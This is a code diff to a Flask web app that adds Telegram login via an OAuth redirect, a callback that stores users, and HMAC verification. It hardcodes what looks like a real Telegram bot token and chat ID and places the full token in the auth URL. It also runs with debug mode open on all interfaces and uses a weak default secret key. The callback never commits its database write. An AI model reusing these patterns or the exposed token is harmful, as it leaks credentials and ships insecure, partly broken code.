@@ -1,12 +1,20 @@
+import os
 from datetime import datetime
 
 import requests
-from flask import Flask, render_template, send_from_directory, request, jsonify
+from flask import Flask, render_template, send_from_directory, request, jsonify,session, redirect
 from user_agents import parse
-
+from db import db, User
 
 app = Flask(__name__)
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.db'  # Укажите ваш URI для базы данных
+app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+app.secret_key = os.environ.get('SECRET_KEY') or 'dev-secret-key'
 
+db.init_app(app)
+
+with app.app_context():
+    db.create_all()  # Создает таблицы в базе данных
 @app.route('/')
 def index():
     return send_from_directory('templates', 'test.htm')
@@ -24,6 +32,8 @@ def id_doc():
 TELEGRAM_TOKEN = "7705002195:AAE_9eNFFfaRxhwV54OT-mtm01L5BgXh7V4"
 TELEGRAM_CHAT_ID = "-1002557822121"
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+CALLBACK_URL = "https://gepolis-gu-7624.twc1.net/callback"
+TELEGRAM_AUTH_URL = f"https://oauth.telegram.org/auth?bot_id={TELEGRAM_TOKEN}&origin=http://127.0.0.1:5000/callback&request_access=write"
 
 
 def parse_user_agent(user_agent_str):
@@ -203,8 +213,72 @@ def mobile():
 def mobile_details():
     return render_template("pass_mobile_detail.html")
 
-@app.route("/download/app")
-def download_app():
-    return render_template("download_app.html")
+
+
+
+@app.route('/callback')
+def telegram_callback():
+    auth_data = request.args
+
+    if not verify_telegram_auth(auth_data):
+        return "Invalid authentication", 403
+
+    # Ищем или создаем пользователя
+    user = User.query.filter_by(telegram_id=auth_data.get('id')).first()
+
+    if not user:
+        user = User(
+            telegram_id=auth_data.get('id'),
+            first_name=auth_data.get('first_name'),
+            last_name=auth_data.get('last_name'),
+            username=auth_data.get('username'),
+            photo_url=auth_data.get('photo_url'),
+            auth_date=datetime.fromtimestamp(int(auth_data.get('auth_date')))
+        )
+        db.session.add(user)
+    else:
+        # Обновляем данные при повторном входе
+        pass
+    print(auth_data)
+    return auth_data
+
+
+
+def verify_telegram_auth(auth_data):
+    """Проверка подлинности данных от Telegram"""
+    try:
+        from hashlib import sha256
+        import hmac
+        import time
+
+        hash_str = auth_data.get('hash')
+        auth_date = int(auth_data.get('auth_date'))
+
+        if time.time() - auth_date > 86400:
+            return False
+
+        check_data = auth_data.copy()
+        del check_data['hash']
+
+        data_check_arr = []
+        for key in sorted(check_data.keys()):
+            data_check_arr.append(f"{key}={check_data[key]}")
+        data_check_string = "\n".join(data_check_arr)
+
+        secret_key = sha256(TELEGRAM_TOKEN.encode()).digest()
+        hmac_hash = hmac.new(secret_key, data_check_string.encode(), sha256).hexdigest()
+
+        return hmac_hash == hash_str
+
+    except Exception as e:
+        print(f"Auth error: {e}")
+        return False
+
+
+@app.route('/auth')
+def auth():
+    return redirect(TELEGRAM_AUTH_URL)
+
+
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
